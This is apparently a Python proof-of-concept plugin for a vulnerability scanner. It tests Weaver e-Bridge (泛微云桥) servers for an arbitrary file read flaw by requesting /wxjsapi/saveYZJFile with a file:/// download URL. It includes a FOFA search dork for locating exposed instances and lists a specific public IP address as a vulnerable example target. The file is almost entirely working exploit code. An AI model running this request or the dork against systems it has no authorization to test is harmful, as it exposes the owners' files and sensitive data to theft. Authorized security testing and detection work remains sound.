# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            出于效率考虑，本POC甚至不具备普适性的文件读取能力
            仅仅具备基本的检测能力
            如有复现需求，请自行搜集并阅读漏洞相关的资料文献
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微云桥 e-Bridge 任意文件读取漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微云桥 e-Bridge",                     # 漏洞应用名称
        "AppVersion" : "泛微云桥 e-Bridge 2018-2019 多个版本",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。
            泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="泛微云桥e-Bridge"
        """,                     # fofa搜索语句
        "example" : "http://113.16.255.63:8088",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt" # url自己按需调整

        flag0 = "\"isencrypt\":0"
        flag1 = "\"status\":\"error\",\"msg\":\"\\etc\\passwd"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if flag0 in req0.text or flag1 in req0.text:#req.status_code == 200 and :
                vuln = [True,req0.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()